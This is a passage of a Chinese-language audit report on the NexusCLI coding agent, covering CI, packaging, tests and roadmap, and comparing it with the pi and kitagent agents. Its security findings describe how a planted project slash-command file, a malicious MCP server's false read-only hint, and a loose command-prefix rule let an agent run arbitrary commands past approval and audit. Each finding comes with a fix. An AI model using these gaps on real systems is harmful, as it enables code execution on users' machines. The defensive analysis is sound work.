# NexusCLI 深度调研：现状、改进清单与 pi / kitagent 对比

> 调研对象：`/Users/linyixi/nexuscli`（`linixiyi/nexuscli`，HEAD `c487415`，v0.2.0，2026-11-03）
> 对比对象：`earendil-works/pi`（`085c84e`，2026-11-07）、`zed123214/kitagent`（`eccf32b`，2026-10-24）
> 调研日期：2026-11-07
> 方法：全量测试 + ruff/mypy/build 实测 + 文档/源码定点阅读 + 两个竞品只读克隆；三份底稿见附录 A/B/C。
> 结论口径：所有“实测”均在本机执行；竞品未运行其测试，性能数字标“自述”；star 数只作背景，不作质量结论。

## 目录

- [0. 结论摘要](#0-结论摘要)
- [1. 项目基线](#1-项目基线)
- [2. 健康度体检](#2-健康度体检)
- [3. 改进清单](#3-改进清单)
- [4. 与 pi 对比](#4-与-pi-对比)
- [5. 与 kitagent 对比](#5-与-kitagent-对比)
- [6. 30-60-90 路线图](#6-30-60-90-路线图)
- [7. 结论](#7-结论)
- [附录 A：NexusCLI 审计底稿](#附录-anexuscli-审计底稿原文)
- [附录 B：pi 竞品分析底稿](#附录-bpi-竞品分析底稿原文)
- [附录 C：kitagent 竞品分析底稿](#附录-ckitagent-竞品分析底稿原文)
- [附录 D：复现命令、证据索引与来源](#附录-d复现命令证据索引与来源)

## 0. 结论摘要

### 0.1 一句话

NexusCLI 是一个**功能密度罕见、工程态度认真，但“最后一公里”没有闭环**的 Python coding agent：它有 25 个工具、三条执行路径、双轨 eval、Runtime API 和 Web workbench，却在主分支 CI 16 连红、PyPI 404、wheel 装不出 workbench 的状态下继续加功能；同时有三个 P0 级安全/正确性缺口。与 pi 比，它缺生态与分发；与 kitagent 比，它缺沙箱与失败语义。它不需要“再做一个功能”，需要先把发布、安全和第二条执行路径的护栏补齐。

### 0.2 十条判断

1. **能力面已经是“产品级”**：33,338 行、136 模块、25 个内置工具 + 2 个 vfs、32 个 slash 命令、ReAct/Plan/Team 三条路径、MCP client+server、memory/RAG、skill L0–L2、snapshot/journal、双轨 eval、Runtime API + SSE、React workbench。这个广度在 Python 同类里少见。
2. **测试不是摆设**：141 个测试模块、1693 个用例，全量 **1690 passed / 3 skipped / 417.84s**；全仓 **0 处 `unittest.mock`**，审批五键位、审计归因、journal、turn checkpoint、SSE bootstrap+CSRF 都有行为级断言。
3. **但主分支是红的**：GitHub Actions **Run 48–63 连续 16 次失败**，徽章 `failing`；最新失败是 `Ruff lint` exit 1，本地可复现 `site/build.py:29:70`、`:45:72` 两处 E501。红色没有阻断发布：仓库没有 tag、没有 release，CI 也没有成为合并门禁的可见证据。
4. **发布链是断的**：PyPI `nexuscli` **404**、0 个 git tag、无 release workflow；`uv build` 的 wheel **468KB/142 files 不含 frontend**，sdist **29MB/3863 个 node_modules 条目**；从 wheel 安装，workbench 是空态。
5. **三个 P0 不是 cosmetic**：① 项目级 slash 命令的 `!` 注入绕过审批/审计/路径守卫，克隆不可信仓库即可 RCE；② MCP `readOnlyHint` 被当成可信只读，plan 模式可被恶意 server 绕过；③ plan/team worker 走 `query()`，ReAct 的 LoopGuard/压缩重试/截断保护/max_turns 警告四道护栏全部缺席。
6. **P1 集中在“第二条执行路径”**：plan 每任务 `history=[]`、team 并行 worker 共享并回写 `self.history`、plan worker 不传 journal/run_id、deny/skip 审计不受开关控制、MCP server 就地改写共享 config。这些不是“再加功能”，是“已有功能在非主路径上不一致”。
7. **质量信号不可全信**：mypy **30 个模块 / 15,289 行 = 45.9%** 源码在 `ignore_errors` 里，且“只减不增”没有机器校验；无 coverage 配置/门禁；`testing-matrix` 停在 2026-10-18；pty 测试仅 4 个文件；CI 的 frontend job 只 build + dist 同步，不跑 Playwright e2e。
8. **vs pi：两种产品哲学**。pi 是“极简、可扩展的 harness + 生态”：30+ provider、OAuth、会话树、结构化压缩、79 个扩展示例、install.sh/npm/nix/单二进制、120.6k stars；它刻意不做内置权限/子代理/plan。NexusCLI 是“电池全包的产品型 agent”：工具/权限/编排/eval/Runtime/Workbench 都内置。pi 赢在生态与分发，NexusCLI 赢在开箱能力与治理。
9. **vs kitagent：两种可靠性层级**。kitagent 是 daemon-first 的本地运行时：常驻 Core + typed JSON-RPC、Loop/LangGraph 双引擎、K8s 沙箱、capability+lease+journal 恢复、预算四分法、5 个 CI job、mypy strict；但只有 9 个工具、单一 Anthropic provider、无 eval、无 PyPI。它赢在执行边界与失败语义，NexusCLI 赢在产品广度与评测。
10. **最大风险不是竞品，是“功能继续加、闭环不补”**：每多一个入口，就多一套未统一的循环、未打包的资产、未覆盖的测试。建议顺序：**第 1 周发布阻断项（CI/安全/打包/README）→ 第 2–4 周正确性与质量门 → 第 2–3 月差异化（沙箱/会话树/插件/生态）**。

### 0.3 评分（10 分制，主观）

| 维度 | 分数 | 主要依据 |
|---|---:|---|
| 架构一致性 | 5.5 | 三路径共享是设计目标，但 `query()` 与 ReAct 双循环已分叉 |
| 安全 | 6.5 | 审批/规则/审计/清洗是真的，但 3 个 P0 + “护栏不是沙箱” |
| 代码质量 | 6.5 | 结构清楚、命名好；4 个 god file、49 处 broad except、46% mypy 豁免 |
| 测试 | 7.5 | 1690 真跑、0 mock；但无 coverage、pty/并发/恢复组合薄 |
| 产品 | 7.0 | 功能面强、workbench 完整；workbench 审批/测试/打包有缺口 |
| 文档 | 6.0 | 21 篇 docs 有深度；无 demo 图、site 无搜索、矩阵过期 |
| 可维护性 | 6.0 | 分层清楚；双循环/复制 helper/死代码是债 |
| 发布就绪 | 3.5 | CI 红、PyPI 404、wheel 缺 workbench、sdist 29MB |
| 生态/社区 | 2.0 | 0 stars、单作者、无 issue/PR 模板、无插件市场 |

> 前七项来自审计底稿（附录 A），后两项是 Lead 按发布事实补的。分数不是精确测量，只用于排序。

## 1. 项目基线

### 1.1 事实台账

| 项 | 事实 |
|---|---|
| 仓库/版本 | `linixiyi/nexuscli`，v0.2.0，HEAD `c487415`（2026-11-03） |
| 许可 | AGPL-3.0-only |
| 语言/运行时 | Python >=3.11；六项运行期依赖 `httpx/mcp/pillow/prompt-toolkit/rich/typer` |
| 规模 | `src/` 136 个 .py / 33,338 行；`tests/` 141 个测试模块 + conftest |
| 历史 | 166 commits；首提交 2026-09-01；提交作者单一 |
| 社区 | 0 stars（2026-11-07）；无 tag；无 PyPI 发布 |
| 测试 | 1693 collected；1690 passed / 3 skipped / 417.84s |
| 静态检查 | ruff `E,F,I,UP,B,SIM`，line-length 100；mypy 渐进，30 模块豁免 |
| CI | Ubuntu 3.11/3.12 + Windows 3.12；ruff → format → endpoint docs → mypy → pytest；frontend build job |
| 分发 | wheel 468KB/142 files；sdist 29MB；PyPI 404 |
| 文档 | 21 篇 docs；README 384 行/28KB；TUTORIAL 322 行；site 静态站 |

### 1.2 架构与能力面

```
entrypoints/  cli.py, repl.py, runtime/api.py
    │
agent/        agent.py (ReAct), query.py (worker loop), plan_execute.py, orchestrator.py (Team)
    │
tools/        executor.py (门链), builtins.py (25 tools), commands.py, mcp/
    │
policy/       approval, permission_rules, path/command guard, sandbox env
context/      manager, memory/, skill/, snapshot, journal, turn checkpoint
llm/          factory, openai_compatible, anthropic, model_profiles, pricing
workbench/    frontend (React 19 + Vite) + Runtime API + SSE
```

设计目标（NEXUS.md）：三条执行路径必须共享工具、策略、记忆、Skill、快照。审计结论：**共享是“复制后各改各的”**，不是同一个循环。

能力面（README 宣称，抽查属实）：Plan/Team、workflow/expert、subagents、MCP client+server、memory、Skill L0/L1/L2、snapshot、turn checkpoint/journal、RAG BM25+scope、双轨 eval、Runtime API、workbench、cron、goal/effort/fork、telemetry、SDK、图片输入；32 个 slash 命令；25 builtin tools + 2 vfs。

### 1.3 真正被验证过的优点

- **测试态度**：0 处 `unittest.mock`；用假 LLM/假 provider 驱动真实 Agent；审批、审计、journal、checkpoint、SSE 都有行为断言。
- **权限链完整**：`deny > ask > allow`；五键位 `y/r/a/s/n`；`-p` 无审批 fail-closed；`--yes` 显式放行；env 清洗剔除 KEY/SECRET/TOKEN 等；审计带 `readonly-rule`/`run-scope` 归因。
- **可恢复性**：turn checkpoint + journal + snapshot 不是 PPT，代码里有恢复路径和测试。
- **评测双轨**：hermetic 假 LLM 进 CI；real 轨真实模型 + pass^k + LLM-as-judge + 可选写域质量门。
- **文档深度**：`docs/permissions.md`、`docs/testing-matrix.md`、`docs/eval.md`、`docs/workbench.md` 都写到了实现细节和边界，不是营销页。

### 1.4 方法与限制

- NexusCLI：本机全量 pytest、ruff、mypy、`uv build`、CLI 冷启动、文档/源码定点阅读；**没有真实模型 API key，未跑 `eval run --real`**。
- pi/kitagent：只读克隆到固定 commit，读 README/docs/源码/CI；**未运行其测试或基准**，性能数字标“自述”。
- 覆盖率：尝试 `pytest-cov` 全量，进度到 68% 后停留超过 9 分钟（基线全量 6:58），手动终止；**本报告不给出覆盖率数字**。该现象本身说明插桩下存在慢/不稳定测试，需单独排查。
- star 数、npm 下载量是 2026-11-07 的页面事实，只作背景，不作质量结论。

## 2. 健康度体检

### 2.1 CI：16 连红，徽章已经 `failing`

事实：

- 工作流页 Run 48–63 **连续 16 次失败**；最新 Run 63（ID `41664990805`）的失败 job 注解为 `Ruff lint / Process completed with exit code 1`。
- 本地 `ruff check .` 复现 2 个 E501：`site/build.py:29:70`、`site/build.py:45:72`（102 > 100）；`ruff format --check .` 还要求重排 `site/build.py`。
- `src/` 单独跑 ruff 是干净的；红的是站点构建脚本，不是核心代码。
- README 顶部挂 CI 徽章，当前显示 `failing`。

为什么这不是“小问题”：

1. 这是访客看到的第一屏；红徽章等于告诉别人“主分支不可信”。
2. 连续 16 次失败没有带来任何发布/合并上的阻断：仓库没有 tag、没有 release；CI 事实上退化为“事后通知”。
3. 修它只需要改两行 + 格式化，成本极低；**不修**才是信号问题。

建议：修 E501/format；在 CI 里保留 `ruff format --check`；给 main 加 branch protection（至少 required checks）；把徽章恢复绿色后再做 release。

### 2.2 类型与覆盖率：46% 源码在豁免里

- `pyproject.toml` 的 `[[tool.mypy.overrides]]` 列了 30 个 module，解析到 **30 个文件 / 15,289 行 = 45.9%** 的 33,338 行源码；其中包括 `runtime/api.py`、`builtins.py`、`repl.py`、`cli.py`、`agent.py` 这些核心文件。
- 注释写“2026-10-25 基线 119 errors/30 files/128 checked，只减不增”，但仓库里**没有脚本/CI 检查这个不变量**；下一个人可以无声地再加一个豁免。
- 没有 coverage 配置、没有覆盖率门禁、没有 `pytest-cov` 依赖；`testing-matrix.md` 自述覆盖到 2026-10-18，之后新增的 workbench UX、skill propose、workflow/expert、real-eval 写域没有进矩阵。
- pty 相关测试只有 4 个文件；真实终端证据多在 `.spec/` 一次性留痕，CI 不可复现。

建议：先测基线覆盖率（修掉插桩下的慢测试），设一个低门槛（如 55%）+ ratchet；mypy 写一个 `scripts/check_mypy_ratchet.py`，把“豁免模块数/行数”做成可比较的数字；矩阵按月刷新，新增表面必须加行。

### 2.3 分发：PyPI 404、wheel 缺 workbench、sdist 29MB

- PyPI `https://pypi.org/pypi/nexuscli/json` → **404**；`git tag` 0 个；`.github/workflows/` 只有 ci.yml + pages.yml，**没有 release workflow**；README 只教 `git clone`。
- `uv build` 实测：wheel `nexuscli-0.2.0-py3-none-any.whl` **468KB / 142 files**，**不含 `frontend/dist`**；sdist **29MB**，`tar tzf | grep -c node_modules` = **3863**。
- `frontend/dist` 是入库的（`.gitignore` 有 `!frontend/dist/`），但 wheel 不打包它；从 wheel 安装后 workbench 没有静态资源，等于空态。
- `frontend/test-results/.last-run.json` 被 git 跟踪；`.spec/` 601 个文件被跟踪；sdist 里还混入 `.spec` 316 个文件。
- 没有 `CONTRIBUTING.md`、`SECURITY.md`、issue/PR 模板；有 `CHANGELOG.md`，但停在 `[Unreleased]`，没有对应 tag。

建议（按优先级）：

1. CI 先 build frontend，再 `uv build`；用 hatch 的 force-include 把 `frontend/dist` 打进 wheel（或改为首次运行时下载，但离线体验差）。
2. sdist 排除 `node_modules`、`frontend/test-results`、`.spec`；目标 < 5MB。
3. 加 release workflow（tag → build → PyPI trusted publishing → GitHub Release），先发 `0.2.1`。
4. README 首屏改成 `uv tool install nexuscli` / `pip install nexuscli`，再给源码安装。
5. 加 CONTRIBUTING/SECURITY/issue 模板；把 `test-results` 从 git 移除。

### 2.4 文档与社区：21 篇 docs，但没有一张 demo 图

- 21 篇 docs 有真正的机制说明；README 384 行/28KB，信息密度高。
- 但 README **没有 demo 截图/GIF**，只有 badges + `docs/architecture.png`；README:303 还留着 `TODO(截图)`。
- site 是静态站，无搜索；主要中文；0 stars、单作者、无 issue/PR 模板。
- 对一个新用户，“能不能 3 分钟看到它跑起来”比“有多少特性”更重要；现在缺的是**可感知的证据**：一张 TUI 截图、一段 20 秒 GIF、一个 `docker run` 或 `uvx` 一行命令。

建议：录一个 20–30 秒 GIF（启动 → 问一个需要读文件的问题 → 审批 → 改文件 → 跑测试）；workbench 放 2 张截图；README 顶部放“30 秒上手”；site 加搜索（Pagefind/Algolia 均可）。

### 2.5 安全姿态：护栏不是沙箱

- 项目自己写得很清楚：`docs/permissions.md` 明确“护栏不是沙箱”；`CommandGuard` docstring 自述“not a security boundary ... trivially bypassable”；`PathGuard` 只做 workspace `relative_to`。
- 已经做对的：审批五键位、`deny > ask > allow`、`-p` fail-closed、env 清洗、审计、写域守卫、plan 只读闸。
- 但三个 P0 把“护栏”撕开了口子（见 3.1）：项目级 slash 注入完全绕过 ToolExecutor；MCP 的 `readOnlyHint` 被当成本地可信；plan/team 的第二条循环没有 ReAct 的护栏。
- 未清洗路径还有：MCP stdio server 的 env、hooks runner、slash 命令注入；OS 级沙箱仍是挂账。

建议：短期修三个 P0 + 把“未清洗路径”列成清单逐条收口；中期做**可选**的 OS 沙箱后端（macOS seatbelt / Linux landlock+bubblewrap / Windows 暂不支持），默认关闭、显式开启，不要承诺“安全沙箱”。

### 2.6 小结：不是能力问题，是闭环问题

NexusCLI 的强项是“把很多 agent 能力真的做出来了”；弱项是“让这些能力可安装、可验证、可安全地跑在别人的机器上”。这两件事的修法完全不同：前者靠继续写功能，后者靠发布工程、测试门禁、安全边界。当前阶段应该暂停“再加一个功能”，把后者补齐。

## 3. 改进清单

### 3.1 P0（发布前必须修）

| ID | 问题 | 证据 | 影响 |
|---|---|---|---|
| P0-1 | 项目级 slash 命令 `!` 注入绕过审批/审计/路径守卫 | `entrypoints/slash_commands.py:213-235`；`tools/commands.py:358-362`；调用点 `custom_cmds.py:95` | 克隆不可信仓库 → 执行 `/xxx` → 任意 shell + 用户 env，无审计 |
| P0-2 | MCP `readOnlyHint` 被当成本地可信只读 | `mcp/client.py:259,282-284`；`tools/executor.py:171,451` | 恶意 MCP server 在 plan 模式删文件、default 免审批 |
| P0-3 | plan/team worker 走 `query()`，ReAct 四道护栏缺席 | `agent.py:284-632` vs `query.py:19-182`；`plan_execute.py:373`；`orchestrator.py:175` | 循环/上下文超限/截断无保护；plan 任务上限 200 轮；两条路径行为分叉 |
| P0-4 | 发布链断裂（CI 红/PyPI 404/wheel 缺 workbench） | 见 2.1–2.3 | 用户装不上、workbench 空态、徽章红 |

#### P0-1 项目级 slash 注入

**现象**：`<cwd>/.nexuscli/commands/*.md` 里的 `!` 行由 `_run_injection` 直接调用 `CommandExecutor.execute`，不经过 `ToolExecutor`。`CommandExecutor` 不感知 `ToolContext`，没有 approval callback、没有 audit、没有 `PathGuard`/`FSScope`，env 是 `os.environ.copy()`。唯一的拦阻是 `CommandGuard` 的 9 条正则，而它自己写着“trivially bypassable”。

**影响**：攻击者只需在仓库里放一个 `.nexuscli/commands/hello.md`，受害者执行 `/hello` 就会跑任意命令，且审计里没有记录。这是供应链 RCE，不是“提示注入”级别的风险。

**修法**：

1. 注入走 `ToolExecutor` 的合成 `ToolCall`，复用 approval/audit/PathGuard/FSScope/env sanitize。
2. 项目级命令的 `!` 默认要求确认；用户级/内置命令可按现有策略。
3. 删除模块级空黑名单 `_INJECTION_EXECUTOR`（`slash_commands.py:50`），或让它真正生效。
4. 加测试：恶意命令文件在 default/plan 模式下被拒/被问；审计有记录；env 里没有 `*_KEY`。

**验收**：不可信仓库的 `/cmd` 不能无提示执行；所有注入在审计里有 `tool=slash_injection` 记录；`plan` 模式直接拒绝写命令。

#### P0-2 MCP 只读注解

**现象**：`mcp/client.py` 把 server 返回的 `annotations.readOnlyHint` 直接映射为 `Tool(is_read_only=True, danger_level="safe", requires_approval=False)`；`executor.py` 的 plan 闸门对 `is_read_only` 直接放行，auto 模式也据此免审批。

**影响**：MCP server 是外部进程，`readOnlyHint` 只是提示，不是本地可信声明。一个恶意/被投毒的 server 可以声明“只读”然后删文件；plan 模式本应只读，却会执行它。

**修法**：

1. MCP 工具的 `is_read_only` 恒为 `False`，`requires_approval` 恒为 `True`；`danger_level` 至少 `medium`。
2. 如果确实需要“可信只读”，加本地显式 allowlist（按 server + tool 名 + 用户确认），不要信 server 自报。
3. plan 闸门对 MCP 写工具一律拒绝，除非本地 allowlist 明确放行。
4. 加测试：假 server 返回 `readOnlyHint=true` + 一个会写文件的 tool；plan 模式拒绝，default 模式问，auto 模式也问。

**验收**：MCP 工具不再因注解获得任何本地特权；审计记录 `mcp` 来源。

#### P0-3 双循环与四道护栏

**现象**：ReAct 主循环在 `agent.py:284-632`，plan/team worker 用 `query.py:19-182`。`query.py` 有 `ContextWindowManager.prepare` 的压缩，但没有：

- `LoopGuard`（`agent.py:348`）；
- provider 超限时 `compact_now`/`force_trim` 重试（`agent.py:415-471`）；
- F12 `max_tokens` 截断保护（`agent.py:468-500`）；
- `max_turns` 撞顶 warning（`agent.py:464`）。

另外 `_prepend_skill_candidates` 已分叉：`agent.py:765` 用 L0 abstract，`query.py:251-258` 用 description；10 个 helper 是逐行复制。`Agent._run_plan` 把 `max_task_turns` 抬到 200（`agent.py:633-650`）。

**影响**：plan/team 是“另一条产品路径”，但它在循环保护、上下文超限、截断、技能注入上与 ReAct 不一致；200 轮上限让“跑飞”的代价很高。用户看到的是“同一个产品，换个模式就变笨/变危险”。

**修法**：

1. 抽一个共享的 `run_loop` 核心（工具调用、压缩、截断、LoopGuard、max_turns、skill 注入），ReAct/plan/team 只提供“下一步决策”策略；或至少把四个护栏下沉到 `query()`，并加 parity 测试。
2. 统一 `_prepend_skill_candidates`，用同一套 L0/L1 选择逻辑。
3. `max_task_turns` 默认降到 20–30，硬上限 50；可配置但要有 warning。
4. 加测试：同一个假 LLM 场景在 ReAct/plan/team 下产生相同的 guard 事件/终止原因。

**验收**：三条路径共享同一套 guard 代码（或 parity 测试覆盖）；plan/team 在上下文超限/循环/截断时行为与 ReAct 一致；默认不再有 200 轮。

#### P0-4 发布链

**现象**：CI 16 连红；PyPI 404；无 tag/release；wheel 不含 frontend；sdist 29MB/3863 node_modules；README 只教 git clone。

**修法**（一周内）：

1. 修 `site/build.py` 两处 E501 + format，恢复 CI 绿；加 branch protection。
2. CI 先 `npm ci && npm run build`，再 `uv build`；hatch `force-include` 把 `frontend/dist` 打进 wheel；sdist 排除 `node_modules`/`.spec`/`test-results`。
3. 加 release workflow：tag → build → PyPI trusted publishing → GitHub Release；发 `0.2.1`。
4. README 首屏改为安装命令；加 20 秒 GIF + workbench 截图；加 CONTRIBUTING/SECURITY/issue 模板。

**验收**：`pip install nexuscli` 可用；`nexuscli --version` 正常；`nexuscli serve` 打开 workbench 有 UI；sdist < 5MB；CI 徽章绿；有 tag 和 Release notes。

### 3.2 P1（1–2 个迭代）

| ID | 问题 | 证据 | 修法 |
|---|---|---|---|
| P1-1 | plan 每任务丢会话历史 | `plan_execute.py:378` `history=[]`；`agent.py:643` 传了 history 但 planner 无入参 | planner 接收 history；每任务带上（可裁剪）；done 时统一追加 |
| P1-2 | team 并行 worker 共享并回写 `self.history` | `orchestrator.py:180,192,487` | 每 worker 独立 history，完成后由编排器合并；加并发测试 |
| P1-3 | plan worker 不传 journal/run_id | `plan_execute.py:373-382`；`self._journal` 死字段 `:55-58` | 传入 journal/run_id；恢复后不重复副作用 |
| P1-4 | deny/skip 审计不受 `features.audit_log` 控制 | `tools/executor.py:270-285` | 与其他 6 处一致，统一受开关控制 |
| P1-5 | MCP server 就地改写共享 config | `mcp/server.py:86` `config.policy.hitl_mode="never"` | 用 per-run 副本；加测试确认不污染会话 config |
| P1-6 | `prefix:*` 无词边界 | `permission_rules.py:109` `startswith(rule.spec[:-2])` | 用 `shlex` 分词/边界匹配；`git diff:*` 不能放行 `git difftool` |
| P1-7 | `-p "/cmd"` 只做文本展开 | `cli.py:295` | 消费 frontmatter 的 `mode`/`allowed_tools`；与 REPL 同口径 |
| P1-8 | workbench 审批/测试缺口 | `docs/workbench.md` 自述 | Web 加 approve_run/auto；审批改 SSE；300s 可配；前端单测 + CI e2e |
| P1-9 | 质量门缺失 | 2.2 | coverage 基线+ratchet；mypy ratchet 脚本；pty/并发/恢复测试；矩阵刷新 |
| P1-10 | 分发卫生 | 2.3 | 见 P0-4；另移除 `frontend/test-results` 跟踪 |
| P1-11 | 文档/社区 | 2.4 | demo GIF；site 搜索；英文 README；issue/PR 模板 |
| P1-12 | lsp 名实不符 + 死代码 | `lsp/` 18 行 py_compile 包装；`PlainRenderer` 仅导出 | 改名 `py_compile` 或实现真 LSP；删死代码 |

补充说明（挑几个容易误判的）：

- **P1-1/P1-2 是“产品不一致”而不是“小 bug”**：用户切到 plan/team 就是为了更强的编排，如果历史丢了、并发串线，编排质量会低于 ReAct。
- **P1-6 是安全边界问题**：`allow bash(git diff:*)` 放行 `git difftool`，而 `difftool` 可以执行任意命令；这不是“少写一个字符”，是规则语义错误。
- **P1-7 是“文档承诺 vs 实现”**：命令 frontmatter 支持 `mode`/`allowed_tools`，但 `-p` 路径不消费；用户以为切了模式，实际没有。
- **P1-8 的 300s 超时 deny**：Web 端审批超过 5 分钟自动拒绝，长任务会莫名失败；至少要可配置 + 明确提示。

### 3.3 P2（打磨项）

- 4 个 god file：`runtime/api.py` 1791、`eval/real.py` 1314、`repl.py` 1222、`builtins.py` 1199；按职责拆。
- 49 处 broad `except`；至少给核心路径加 `exc_info`/类型化错误。
- `PlainRenderer` 死代码；`lsp/` 名实不符；模块级 `_INJECTION_EXECUTOR` 空黑名单。
- team 共享 `skill_context_buffer` 与 plan 注释相反（审计 P2）。
- `.spec/` 601 个文件被跟踪；要么移出仓库，要么明确“内部流程产物”并排除出 sdist。
- `frontend/test-results/.last-run.json` 跟踪；`dist/` 本地产物未跟踪（正常）。
- README:303 `TODO(截图)`；site 无搜索；中文为主。
- telemetry 默认关闭是好事；补一个“如何验证不上报”的文档段落。
- `MODEL_CONTEXT_WINDOWS` 只有 deepseek/glm 几条；补全或用 provider 返回值。
- 3 处 TODO/FIXME 逐个清掉或转 issue。
- **中期差异化（2–3 月，不塞进 1–2 个迭代）**：provider 深度（Google 原生/本地模型/OAuth）、会话树、结构化压缩、插件包格式、可选 OS 沙箱（`ExecutionBackend`：seatbelt/landlock/bubblewrap）。这些是路线图 6.3 的内容，不是 P1 的“修 bug”。

### 3.4 不建议做的事

- **不要**为了对标 pi 加 30 个 provider；先把 6 类 provider 的缓存/错误/限流做扎实。
- **不要**照搬 pi 的“零权限 + 进程内任意扩展”；NexusCLI 的用户群和威胁模型不同。
- **不要**照搬 kitagent 的 daemon/K8s/capability/lease 全家桶；单机 CLI 不需要分布式运行时。
- **不要**自研 TUI 渲染器；prompt_toolkit/rich 够用，把精力放在可靠性。
- **不要**用 star 数/下载量做路线图；先把安装、CI、安全闭环。
- **不要**承诺“exactly-once”或“安全沙箱”，除非有对应的实现和测试。

## 4. 与 pi 对比

### 4.1 pi 的形态

- `earendil-works/pi`（原 `badlogic/pi-mono`），MIT，TypeScript monorepo：**573,266 行 / 2,595 个 .ts / 12 个包**，Node 22.19+。
- 定位：**minimal, extensible agent harness**。核心刻意不做 sub-agents、plan mode、内置权限系统；这些交给 extensions/skills/prompt templates/themes/packages。
- 分发：`install.sh`/`install.ps1`、npm、nix、standalone binaries；`npm run check` 9 步（biome、pinned-deps、entry-graph、tsc×2 等）。
- 生态：**79 个官方扩展示例**；扩展是进程内 TS 模块，可注册工具/命令/事件/UI/供应商/MCP，支持热重载；包可来自 npm/git。
- 模型：**30+ 具名 provider（报告统计 34）** + OAuth + 跨 provider handoff；MCP 支持 OAuth。
- 会话：JSONL 树，`/tree`、`/fork`、`/clone`；压缩是结构化的（Goal/Constraints/Progress/Key Decisions/Next Steps/Critical Context + 文件累计跟踪）。
- 质量：**978 个 `.test.ts`**；291 个 CHANGELOG 版本；`SECURITY.md` 把沙箱列为 out of scope；扩展可读 `auth.json`，生态本身是 RCE 面。
- 社区：**120.6k stars**；npm 周下载 `pi-coding-agent` 606 万、`pi-ai` 1090 万、`pi-tui` 892 万（2026-10-31~11-06，反映被复用，不等于 CLI 用户数）。

### 4.2 能力矩阵

| 维度 | pi | NexusCLI | 判定 |
|---|---|---|---|
| 定位 | 极简可扩展 harness | 电池全包 coding agent | 不同产品 |
| 语言/运行时 | TS/Node 22.19+ | Python 3.11+ | 平 |
| 代码规模 | 573k 行/12 包 | 33k 行/单包 | pi 大一个量级 |
| Provider | 34 + OAuth + handoff | 6 类（含 openai-compatible） | **pi 强** |
| 内置工具 | 8 | 25 + 2 vfs | **NexusCLI 强** |
| 权限/HITL | 无内置，靠容器 | 五键位 + 规则 + 写域 + 审计 | **NexusCLI 强** |
| 子代理 | 示例/扩展 | 一等公民 + mailbox | **NexusCLI 强** |
| Plan/Team | 无内置 | 内置 | **NexusCLI 强** |
| 会话 | JSONL 树/分支 | 线性 + snapshot/journal | **pi 强** |
| 压缩 | 结构化 + 文件台账 | 摘要 + 裁剪 | **pi 强** |
| 扩展生态 | 79 示例 + npm/git + 热重载 | 本地 prompt-style 插件 | **pi 强** |
| Eval | docs-lift，双镜像，不进 CI | hermetic 门禁 + real 双轨 | **NexusCLI 强** |
| Runtime/Web | RPC/SDK/JSON 模式 | Runtime API + SSE + workbench | **NexusCLI 强** |
| 分发 | install.sh/npm/nix/单二进制 | 源码 clone，PyPI 404 | **pi 强** |
| 社区/治理 | 120.6k stars、9 步 check | 0 stars、单作者、CI 红 | **pi 强** |

### 4.3 判定：两种产品哲学

pi 的赌注是“**核心足够小，生态足够大**”：它不内置权限、子代理、plan，而是把扩展点做到极致，让社区用 npm 包补。这个赌注在 120.6k stars、79 个示例、千万级 npm 下载上已经成立。代价是：安全边界外置（容器/信任项目），扩展是进程内任意代码，核心功能的一致性依赖扩展作者。

NexusCLI 的赌注是“**开箱即用的完整产品**”：权限、编排、eval、Runtime、Workbench 都内置，用户不用装十个扩展。这个赌注在功能面成立，但在分发、社区、生态上还没成立。

所以“谁更强”取决于问题：

- 如果你要**一个能装、能扩展、能接任何模型的 harness**：pi 更强。
- 如果你要**一个带审批、审计、plan/team、eval、Web 工作台的产品**：NexusCLI 更强。
- 如果你要**一个能安全跑不可信代码的运行时**：两个都不够，kitagent 更接近（但也只是 K8s 场景）。

### 4.4 可借鉴的 8 条

1. **会话树**：`/tree`/`/fork`/`/clone` + JSONL 分支；NexusCLI 有 fork/snapshot，但没有“会话树”这个一等公民。
2. **结构化压缩 + 文件台账**：不是“摘要成一段”，而是 Goal/Constraints/Progress/Key Decisions/Next Steps/Critical Context，并跟踪文件累计改动；这直接决定长任务质量。
3. **docs-lift eval**：同一任务 with_docs/without_docs 双镜像，量化“文档是否真的帮到 agent”；NexusCLI 的 eval 可以加这一轨。
4. **供应链规则**：pin + min-release-age + `pinned-deps` 检查；NexusCLI 的 Python 侧也应 pin 关键依赖并加检查。
5. **结构检查**：`entry-graph`（入口可达性）、`pinned-deps`；NexusCLI 可以加“每个 console script 的 import 图”检查，防止 wheel 缺模块。
6. **工具输出截断契约**：pi 对工具输出有明确的截断/分页契约；NexusCLI 的 `read_file`/bash 输出也应有统一上限和提示。
7. **缓存成本感知**：cache-warmer 只在预期省 ≥$0.05 时预热；NexusCLI 有 prompt_cache 标志，但没有成本决策。
8. **插件可注册工具**：pi 的扩展能注册工具并走同一执行链；NexusCLI 的插件目前只有 prompt-style 三组件，若要扩展，必须走 `ToolExecutor` 全链（审批/审计/守卫），不能开旁路。

### 4.5 不可照搬的 7 条

1. **零权限**：pi 把安全交给容器/项目信任；NexusCLI 的用户在本地真实项目里跑，必须有 HITL。
2. **进程内任意扩展**：pi 的扩展能读 `auth.json`；NexusCLI 若做插件，必须有 capability/manifest/沙箱，否则就是 P0-1 的放大版。
3. **12 包 monorepo**：NexusCLI 单包 33k 行还没拆明白，不要为了“架构漂亮”先拆 12 个包。
4. **34 provider catalog**：维护成本极高；先做 6 类 provider 的深度（缓存/错误/限流/上下文窗口）。
5. **极简无 plan/子代理**：这是 pi 的哲学，不是 NexusCLI 的；NexusCLI 的差异化恰恰是内置编排。
6. **自研 TUI**：pi 的差分渲染很强，但 NexusCLI 用 prompt_toolkit/rich 已经够；重写会吞掉几个月。
7. **Bun 单二进制**：Python 生态的打包路径不同；先把 wheel/PyPI 做好，再考虑 PyInstaller/uv 单文件。

### 4.6 对 NexusCLI 的含义

pi 是一面“生态与分发”的镜子：NexusCLI 的功能不比 pi 少，但用户“看见、安装、扩展、信任”的路径远弱于 pi。短期不要追 34 个 provider，先做**安装 3 分钟、demo 20 秒、扩展有文档、CI 绿**；中期再做会话树/结构化压缩/插件包格式。star 数不是目标，**可复现的上手体验**才是。

## 5. 与 kitagent 对比

### 5.1 kitagent 的形态

- `zed123214/kitagent`，MIT，Python 3.12，`agent-runtime-kit` v0.0.1；src **20,498 行/128 文件**，tests **22,024 行/99 文件/661 test 函数**。
